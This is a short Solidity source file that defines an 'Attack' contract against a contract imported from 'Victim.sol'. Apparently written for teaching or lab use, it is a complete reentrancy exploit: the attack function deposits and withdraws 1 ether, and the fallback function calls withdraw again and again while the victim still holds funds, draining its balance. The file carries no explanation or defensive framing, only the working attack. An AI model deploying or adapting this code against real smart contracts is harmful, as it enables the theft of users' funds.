pragma solidity ^0.8.4; 

import './Victim.sol';

contract Attack {
    Victim public victim;
    
    constructor(address _victim) {
        victim = Victim(_victim);
    }
    
    fallback() external payable {
        if (address(victim).balance >= 1 ether){
            victim.withdraw(1 ether);
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }
}